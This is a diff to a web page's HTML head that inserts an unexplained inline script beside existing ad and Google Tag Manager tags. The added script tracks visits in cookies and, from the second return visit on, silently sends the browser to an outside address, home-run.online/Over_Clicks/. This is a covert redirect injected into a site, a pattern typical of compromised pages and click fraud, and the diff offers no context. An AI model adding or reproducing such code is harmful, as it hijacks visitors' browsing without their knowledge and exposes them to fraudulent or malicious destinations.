@@ -15,7 +15,66 @@
 <script src='//cdn.clkmc.com/cmc.js'></script>
 
 
-   
+
+
+<script>
+function hasVisitedBefore() {
+    // Check if the cookie exists
+    var cookies = document.cookie.split(';');
+    for (var i = 0; i < cookies.length; i++) {
+        var cookie = cookies[i].trim();
+        if (cookie.startsWith('visited=')) {
+            return true;
+        }
+    }
+    return false;
+}
+
+function redirectToURL(url) {
+    // Redirect to the specified URL
+    window.location.href = url;
+}
+
+// Check if the user has visited before
+if (hasVisitedBefore()) {
+    // Check if this is the second visit
+    var visits = parseInt(getCookieValue('visits')) || 0;
+    if (visits >= 2) {
+        // Redirect to the specified URL after the second visit
+        redirectToURL("https://home-run.online/Over_Clicks/");
+    } else {
+        // Increment visits count
+        document.cookie = "visits=" + (visits + 1) + "; expires=" + getExpiryDate(1) + "; path=/";
+    }
+} else {
+    // Set cookie to indicate the first visit
+    document.cookie = "visited=true; expires=" + getExpiryDate(1) + "; path=/";
+    // Set initial visits count
+    document.cookie = "visits=1; expires=" + getExpiryDate(1) + "; path=/";
+}
+
+function getCookieValue(name) {
+    var cookies = document.cookie.split(';');
+    for (var i = 0; i < cookies.length; i++) {
+        var cookie = cookies[i].trim();
+        if (cookie.startsWith(name + '=')) {
+            return cookie.substring(name.length + 1);
+        }
+    }
+    return null;
+}
+
+function getExpiryDate(days) {
+    var expiryDate = new Date();
+    expiryDate.setDate(expiryDate.getDate() + days);
+    return expiryDate.toUTCString();
+}
+</script>
+    
+
+
+
+    
 
 <!-- Google Tag Manager -->
 <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
